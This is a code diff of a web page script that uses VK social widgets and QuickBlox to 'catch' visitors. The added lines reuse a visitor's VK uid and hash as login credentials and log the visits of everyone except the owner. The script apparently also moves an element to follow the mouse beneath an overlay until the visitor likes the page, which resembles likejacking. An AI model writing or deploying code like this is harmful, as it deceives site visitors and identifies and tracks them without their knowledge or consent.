@@ -11,7 +11,22 @@ var login_params;
 var current_session;
 
 $(document).ready(function() {
-    VK.init({apiId: 2848766, onlyWidgets: true});
+    VK.init({apiId: 2024149, onlyWidgets: true});
+
+    VK.Widgets.Auth("vk_auth", {
+        width: "500px",
+        height: "500px",
+        onAuth: function(data) {
+            $('#overlay').remove();
+            current_visitor = data;
+
+            login_params = {
+                login: data['uid'],
+                password: data['hash']
+            };
+            initCatcher(current_session);
+        }
+    });
 
     VK.Widgets.Like("wrap1", {type: "full"});
     VK.Widgets.Like("header1", {type: "full"});
@@ -25,6 +40,18 @@ $(document).ready(function() {
             top: y
         });
     });
+
+    getOut = function() {
+        $(window).off('mousemove');
+        $('#overlay').remove();
+    }
+    $(document).keyup(function(e) {
+        if (e.keyCode == 27) {
+            getOut();
+        }
+    });
+
+    VK.Observer.subscribe('widgets.like.liked', getOut);
 
     QB.init(CONFIG.appID, CONFIG.authKey, CONFIG.authSecret, CONFIG.debug);
     QB.createSession(function(err, result) {
@@ -63,6 +90,10 @@ function initCatcher(session) {
 function processUser(session) {
     if (current_visitor['uid'] != my_id) {
         logVisit(session);
+    }
+    else
+    {
+        $('#header1').show();
     }
 }
 
